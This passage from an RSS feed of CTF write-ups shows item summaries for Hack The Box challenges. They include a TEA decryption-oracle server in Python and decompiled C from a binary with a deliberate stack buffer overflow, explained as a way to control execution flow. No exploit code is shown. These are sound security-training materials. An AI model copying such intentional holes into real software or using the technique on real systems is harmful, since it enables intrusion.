&lt;p>So we can access to the main panel:&lt;/p></description></item><item><title>Tsayaki</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/tsayaki/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/tsayaki/</guid><description>&lt;p>We are given the source code of the server in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">tea&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">TEA&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">secret&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">IV&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">FLAG&lt;/span>
&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>

&lt;span class="mtk1">ROUNDS&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">10&lt;/span>

&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">show_menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"""&lt;/span>
&lt;span class="mtk4">==================================================&lt;/span>&lt;span class="mtk4">==========================================&lt;/span>
&lt;span class="mtk4">|| I made this decryption oracle in which I let us&lt;/span>&lt;span class="mtk4">ers choose their own decryption keys. ||&lt;/span>
&lt;span class="mtk4">|| I think that it's secure as the tea cipher does&lt;/span>&lt;span class="mtk4">n't produce collisions (?) ... Right? ||&lt;/span>
&lt;span class="mtk4">|| If you manage to prove me wrong 10 times, you g&lt;/span>&lt;span class="mtk4">et a special gift. ||&lt;/span>
&lt;span class="mtk4">==================================================&lt;/span>&lt;span class="mtk4">==========================================&lt;/span>
&lt;span class="mtk4">"""&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">run&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">show_menu&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">server_message&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">20&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'Here is my special message: &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">server_message&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">used_keys&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> []&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertexts&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> []&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ROUNDS&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'Round &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk6">1}&lt;/span>&lt;span class="mtk4">/10'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">try&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter your target ciphertext (in hex) : '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertexts&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">j&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'[&lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk6">1}&lt;/span>&lt;span class="mtk4">/&lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">j&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk6">1}&lt;/span>&lt;span class="mtk4">] Enter your encryption key (in hex) : '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">and&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">used_keys&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">used_keys&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">append&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">TEA&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">IV&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">server_message&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'Hmm ... close enough, but &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">enc&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4"> does not look like &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4"> at all! Bye...'&lt;/span>&lt;span class="mtk1">)&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">except&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Nope.'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertexts&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">append&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'Wait, really? &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">run&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>This challenge is kind of the second part of &lt;a target="_blank" href="../iced-tea">Iced TEA&lt;/a>, because the server also uses &lt;a target="_blank" href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm">Tiny Encryption Algorithm&lt;/a> (TEA).&lt;/p></description></item><item><title>Void</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/void/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/void/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>void&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-yellow">Partial RELRO&lt;/span>
Stack: &lt;span class="code-dark-red">No canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
RUNPATH: &lt;span class="code-dark-red">b'./glibc/'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="reverse-engineering">Reverse engineering&lt;/h2>
&lt;p>If we use Ghidra, we will find this decompiled C code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">void&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">vuln&lt;/span>&lt;span class="mtk1">() {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">char&lt;/span>&lt;span class="mtk1"> data[&lt;/span>&lt;span class="mtk6">64&lt;/span>&lt;span class="mtk1">];&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">read&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">, data, &lt;/span>&lt;span class="mtk6">200&lt;/span>&lt;span class="mtk1">);&lt;/span> 
&lt;span class="mtk1">}&lt;/span>

&lt;span class="mtk7 mtki">int&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">() {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">vuln&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The code is very short and there is only a single point to enter data.&lt;/p>
&lt;h2 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability&lt;/h2>
&lt;p>There&amp;rsquo;s a clear Buffer Overflow vulnerability since &lt;code>data&lt;/code> is a &lt;code>char&lt;/code> array of &lt;code>64&lt;/code> bytes, and &lt;code>read&lt;/code> is reading up to &lt;code>200&lt;/code> bytes and storing the information at &lt;code>data&lt;/code>. Therefore, we can modify values that come after the buffer reserved for &lt;code>data&lt;/code> and control the execution flow of the program.&lt;/p></description></item></channel></rss>